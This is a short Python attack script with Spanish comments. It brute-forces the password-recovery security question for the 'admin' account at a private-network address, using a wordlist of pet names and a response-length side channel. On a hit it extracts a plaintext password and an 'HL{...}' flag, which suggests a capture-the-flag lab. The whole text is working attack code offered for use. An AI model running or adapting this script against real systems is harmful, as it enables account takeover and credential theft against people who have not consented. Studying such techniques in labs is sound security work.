import re
import requests
# Paso 1: obtener pregunta
url_answer = "http://192.168.28.156/recover/answer"
# Paso 2: Ingresar usuario
username = "admin"
# Paso 3: Iterar lista
wordlist = [line.strip() for line in open("mascotas.txt", encoding="utf-8", errors="ignore")]

session = requests.Session()

# Baseline incorrecto
baseline = session.post(
    url_answer,
    data={
        "username": username,
        "answer": "aaaaaa"
    }
)

baseline_length = len(baseline.text)

print(f"[+] Baseline Length: {baseline_length}")
print("-" * 50)

for word in wordlist:

    r = session.post(
        url_answer,
        data={
            "username": username,
            "answer": word
        }
    )

    current_length = len(r.text)

    print(f"Probando: {word} | Length: {current_length}")

    # Detectar respuesta distinta
    if current_length != baseline_length:

        print(f"\n[+] RESPUESTA CORRECTA: {word}")

        # Extraer password
        password = re.search(
            r'Contraseña en texto plano:.*?>([^<]+)<',
            r.text,
            re.DOTALL
        )

        # Extraer flag
        flag = re.search(
            r'HL\{.*?\}',
            r.text
        )

        print("-" * 50)

        if password:
            print(f"[+] Password: {password.group(1)}")

        if flag:
            print(f"[+] Flag: {flag.group()}")

        break

print("\n[+] Script finalizado.")

